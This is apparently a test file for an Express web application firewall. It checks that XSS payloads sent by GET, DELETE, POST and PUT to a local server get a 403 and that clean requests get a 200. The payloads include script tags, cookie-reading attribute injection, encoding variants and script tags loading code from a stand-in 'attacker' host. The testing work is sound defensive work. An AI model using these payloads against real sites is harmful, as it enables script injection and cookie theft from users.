describe("xss", function() {
    var server, emudb, request, waf, port;
    if(process.env.port){
        port = process.env.port;
    } else {
        port = 8080;
    }

    it("should load properly", function(done){
        var express = require('express');
        request = require('request');

        var bodyParser = require('body-parser');

        var TestDB = require('./../database/emulated-db');
        emudb = new TestDB();

        var app = express();

        var ExpressWaf = require('./../express-waf').ExpressWAF;
        var BLOCK_TIME = 1000;
        waf = new ExpressWaf({
            blocker: {
                db: emudb,
                blockTime: BLOCK_TIME
            },
            log: false
        });

        waf.addModule('xss-module', {});

        app.use(bodyParser.json());
        app.use(bodyParser.urlencoded({
            extended: true
        }));

        app.use(waf.check);
        app.use(express.static("./spec"));

        app.get('/', function(req, res) {
            res.status(200).end();
        });

        app.delete('/', function(req, res) {
            res.status(200).end();
        });

        app.post('/', function(req, res) {
            res.status(200).end();
        });

        app.post('/spec', function(req, res) {
            res.status(200).end();
        });

        app.put('/', function(req, res) {
            res.status(200).end();
        });

        server = app.listen(port, function(){
            done();
        });

    });

    it("testGetSimpleXSS", function (done) {
        request.get('http://localhost:' + port + '/spec?user=<script>alert(123)</script>', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testGetTagAttributeValue", function (done) {
        request.get('http://localhost:' + port + '/?user=" onfocus="alert(document.cookie)', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testGetDifferentSyntaxOrEncoding_1", function (done) {
        request.get('http://localhost:' + port + '/?user="><script >alert(document.cookie)</script >', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testGetDifferentSyntaxOrEncoding_2", function (done) {
        request.get('http://localhost:' + port + '/?user="><ScRiPt>alert(document.cookie)</ScRiPt>', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testGetDifferentSyntaxOrEncoding_3", function (done) {
        request.get('http://localhost:' + port + '/?user="%3cscript%3ealert(document.cookie)%3c/script%3e', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testGetNonRecursiveFiltering", function (done) {
        request.get('http://localhost:' + port + '/?user=<scr<script>ipt>alert(document.cookie)</script>', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testGetIncludingExternalScripts_1", function (done) {
        request.get('http://localhost:' + port + '/?user=<script src="http://attacker/xss-modules.js"></script>', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testGetIncludingExternalScripts_2", function (done) {
        request.get('http://localhost:' + port + '/?user=<SCRIPT%20a=">"%20SRC="http://attacker/xss-modules.js"></SCRIPT>', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testGetHTTPParameterPollution", function (done) {
        request.get('http://localhost:' + port + '/?user=<script&param=>[...]</&param=script>"></SCRIPT>', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testGetUsual", function (done) {
        request.get('http://localhost:' + port + '/', function (err, res) {
            expect(res.statusCode).toEqual(200);
            done();
        });
    });

    it("testDeleteSimpleXSS", function (done) {
        request.del('http://localhost:' + port + '/spec?user=<script>alert(123)</script>', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testDeleteTagAttributeValue", function (done) {
        request.del('http://localhost:' + port + '/?user=" onfocus="alert(document.cookie)', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testDeleteDifferentSyntaxOrEncoding_1", function (done) {
        request.del('http://localhost:' + port + '/?user="><script >alert(document.cookie)</script >', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testDeleteDifferentSyntaxOrEncoding_2", function (done) {
        request.del('http://localhost:' + port + '/?user="><ScRiPt>alert(document.cookie)</ScRiPt>', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testDeleteDifferentSyntaxOrEncoding_3", function (done) {
        request.del('http://localhost:' + port + '/?user="%3cscript%3ealert(document.cookie)%3c/script%3e', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testDeleteNonRecursiveFiltering", function (done) {
        request.del('http://localhost:' + port + '/?user=<scr<script>ipt>alert(document.cookie)</script>', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testDeleteIncludingExternalScripts_1", function (done) {
        request.del('http://localhost:' + port + '/?user=<script src="http://attacker/xss-modules.js"></script>', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testDeleteIncludingExternalScripts_2", function (done) {
        request.del('http://localhost:' + port + '/?user=<SCRIPT%20a=">"%20SRC="http://attacker/xss-modules.js', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testDeleteHTTPParameterPollution", function (done) {
        request.del('http://localhost:' + port + '/?user=<script&param=>[...]</&param=script>"></SCRIPT>', function (err, res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testDeleteUsual", function (done) {
        request.del('http://localhost:' + port + '/', function (err, res) {
            expect(res.statusCode).toEqual(200);
            done();
        });
    });

    it("testPostSimpleXSS", function (done) {
        request.post('http://localhost:' + port + '/spec', { form: { user: "<script>alert(123)</script>" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPostTagAttributeValue", function (done) {
        request.post('http://localhost:' + port + '/spec', { form: { user: "\" onfocus=\"alert(document.cookie)" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPostDifferentSyntaxOrEncoding_1", function (done) {
        request.post('http://localhost:' + port + '/spec', { form: { user: "><script >alert(document.cookie)</script >" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPostDifferentSyntaxOrEncoding_2", function (done) {
        request.post('http://localhost:' + port + '/spec', { form: { user: "\"><ScRiPt>alert(document.cookie)</ScRiPt>" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPostDifferentSyntaxOrEncoding_3", function (done) {
        request.post('http://localhost:' + port + '/spec', { form: { user: "\"%3cscript%3ealert(document.cookie)%3c/script%3e" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPostNonRecursiveFiltering", function (done) {
        request.post('http://localhost:' + port + '/spec', { form: { user: "<scr<script>ipt>alert(document.cookie)</script>" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPostIncludingExternalScripts_1", function (done) {
        request.post('http://localhost:' + port + '/spec', { form: { user: "<script src=\"http://attacker/xss-modules.js\"></script>" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPostIncludingExternalScripts_2", function (done) {
        request.post('http://localhost:' + port + '/spec', { form: { user: "<SCRIPT%20a=\">\"%20SRC=\"http://attacker/xss-modules.js\"></SCRIPT> " } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPostHTTPParameterPollution", function (done) {
        request.post('http://localhost:' + port + '/spec', { form: { user: "<script&param=>[...]</&param=script>\"></SCRIPT> " } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPostUsual", function (done) {
        request.post('http://localhost:' + port + '/').on('response', function(res) {
            expect(res.statusCode).toEqual(200);
            done();
        });
    });

    it("testPutSimpleXSS", function (done) {
        request.put('http://localhost:' + port + '/spec', { form: { user: "<script>alert(123)</script>" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPutTagAttributeValue", function (done) {
        request.put('http://localhost:' + port + '/spec', { form: { user: "\" onfocus=\"alert(document.cookie)" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPutDifferentSyntaxOrEncoding_1", function (done) {
        request.put('http://localhost:' + port + '/spec', { form: { user: "><script >alert(document.cookie)</script >" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPutDifferentSyntaxOrEncoding_2", function (done) {
        request.put('http://localhost:' + port + '/spec', { form: { user: "\"><ScRiPt>alert(document.cookie)</ScRiPt>" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPutDifferentSyntaxOrEncoding_3", function (done) {
        request.put('http://localhost:' + port + '/spec', { form: { user: "\"%3cscript%3ealert(document.cookie)%3c/script%3e" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPutNonRecursiveFiltering", function (done) {
        request.put('http://localhost:' + port + '/spec', { form: { user: "<scr<script>ipt>alert(document.cookie)</script>" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPutIncludingExternalScripts_1", function (done) {
        request.put('http://localhost:' + port + '/spec', { form: { user: "<script src=\"http://attacker/xss-modules.js\"></script>" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPutIncludingExternalScripts_2", function (done) {
        request.put('http://localhost:' + port + '/spec', { form: { user: "<SCRIPT%20a=\">\"%20SRC=\"http://attacker/xss-modules.js\"></SCRIPT>" } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPutHTTPParameterPollution", function (done) {
        request.put('http://localhost:' + port + '/spec', { form: { user: "<script&param=>[...]</&param=script>\"></SCRIPT> " } }).on('response', function(res) {
            expect(res.statusCode).toEqual(403);
            emudb.remove("127.0.0.1", function () {
                done();
            });
        });
    });

    it("testPutUsual", function (done) {
        request.put('http://localhost:' + port + '/').on('response', function(res) {
            expect(res.statusCode).toEqual(200);
            done();
        });
    });

    it("should close properly", function(done){
        waf.removeAll(function(){
            server.close(function(){
                done();
            });
        });
    });

});

